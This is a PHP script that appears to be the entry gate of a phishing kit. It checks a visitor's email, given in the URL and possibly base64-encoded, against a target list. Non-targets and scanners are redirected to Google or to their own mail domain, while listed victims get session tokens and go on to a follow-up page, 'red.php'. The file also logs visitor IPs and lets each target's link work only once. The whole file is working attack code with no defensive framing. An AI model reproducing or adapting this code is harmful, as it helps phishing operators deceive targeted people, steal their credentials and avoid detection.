<?php 

session_start();
require_once('config.php');
defined('2BgI5Youc1knSTVZb3VjMWtueVBZOXVETjkwNXkQ4VlMzZmNXNzFFRkx0VE0xQkwvLbk0yTUE9PTV51qt8VS3ZmNXNzFFRkx0VE0xQkw0') or exit(header(sprintf("Location:%s", 'http://www.google.com/search?q=404%20page')));
require_once('netends.php');
require_once('mxrec.php');

if(isset($_GET['email']) && !empty($_GET['email'])) {
    $email = isBase64($_GET['email']) ? base64_decode($_GET['email']) : $_GET['email'];
	if(!is_email($email) || is_null(is_email($email)) || is_email($email) == "" || empty(is_email($email))) {
		exit(header(sprintf("Location:%s", 'http://www.google.com/search?q='.$email)));
	}
	if(!dns_exists($email)) {
		exit(header(sprintf("Location:%s", 'http://'.getDomain($email))));
	}
	
	$_SESSION['visitor_ip'] = show_visitor_ip();
	$_SESSION['myemail'] = $email;
	$_SESSION['referer'] = base64_encode($email);
	
	$file = file_get_contents( $maillistfilename );
	
	if ( $file ) {
		$emails_list = preg_split( '/\n|\r\n?/', $file );
		$emails = !empty($emails_list) ? array_unique( $emails_list ) : '';
		$count = count ($emails);
		if( stripos( $file, $email ) !== FALSE )
		{
			$file = str_replace($email, "\n", $file);
			if($multivisit == 'no') { file_put_contents($maillistfilename, trim($file)); }
			$csrftoken = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));
			$_SESSION['csrftoken'] = $csrftoken;
			$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? 'https://' : 'http://';
			exit(header('Location:'.$protocol.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'].'?csrftoken='.$_SESSION['csrftoken']));
		}
		else {
			$_SESSION = '';
			session_destroy();
			exit(header(sprintf("Location:%s", 'http://'.getDomain($email))));
		}
	} else {
	    $_SESSION = '';
		session_destroy();
		exit(header(sprintf("Location:%s", 'http://'.getDomain($email))));
	}
} elseif(isset($_SESSION['csrftoken'])) {
	if ($_SESSION['csrftoken'] == $_GET['csrftoken']) {
		if ($show_captchaa !== "yes") {
			$newtoken = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));
			$_SESSION['newtoken'] = $newtoken;
			exit(header("Location:red.php?newtoken=".$_SESSION['newtoken']."&email=''"));
		}
		else {
			$tap = Random::AlphaNumeric(128);
			$_SESSION['skii'] = $tap;
			exit(header("Location:red.php?tap=".$_SESSION['skii']));
		}
	}
	else {
		$_SESSION = '';
		session_destroy();
		exit(header(sprintf("Location:%s", $originalurl)));
	}
}
else {
	$_SESSION = '';
	session_destroy();
	exit(header(sprintf("Location:%s", 'http://'.getDomain($email))));
}
